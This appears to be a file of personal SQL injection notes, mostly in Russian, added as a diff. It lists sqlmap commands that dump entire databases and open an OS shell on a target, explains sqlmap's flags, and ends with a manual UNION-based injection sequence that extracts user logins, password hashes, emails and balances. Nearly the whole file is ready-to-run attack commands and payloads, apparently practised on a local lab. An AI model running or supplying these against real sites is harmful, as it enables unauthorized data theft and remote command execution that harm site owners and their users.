@@ -1,0 +1,55 @@
+SQL INJECTIONS
+
+
+
+
+
+
+
+SQL MAP
+
+cd ~/SQL/sqlmap
+python3 sqlmap.py -r ~/SQL/sqli_lab_pg/request.txt -p email --dbms=PostgreSQL --batch --dump
+
+# 1. Быстрая проверка сайта
+python3 sqlmap.py -u "https://site.com/page?id=1"
+
+# 2. Полный анализ параметра
+python3 sqlmap.py -u "https://site.com/search?q=test" -p q --level=5
+
+# 3. Дамп всей базы данных
+python3 sqlmap.py -u "https://site.com/page?id=1" --dump-all
+
+# 4. Получение shell (командной строки)
+python3 sqlmap.py -u "https://site.com/page?id=1" --os-shell
+
+# Использованная команда:
+python3 sqlmap.py -r request.txt --dbms=PostgreSQL --batch --dump
+
+
+Что каждый параметр значит:
+
+    -r request.txt - взять запрос из файла
+
+    --dbms=PostgreSQL - уточняем СУБД (ускоряет работу)
+
+    --batch - автоматически отвечать "да" на все вопросы
+
+    --dump - извлечь все данные из таблиц
+
+
+
+-- Сначала найти количество колонок
+' ORDER BY 7 -- 
+
+-- Потом подобрать UNION
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --
+
+-- Потом выяснить имена таблиц
+' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables --
+
+-- Потом выяснить колонки
+' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' --
+
+-- Потом извлечь данные
+' UNION SELECT login,password_hash,email,full_name,TO_CHAR(birth_date,'YYYY-MM-DD'),gender,balance::text FROM users --
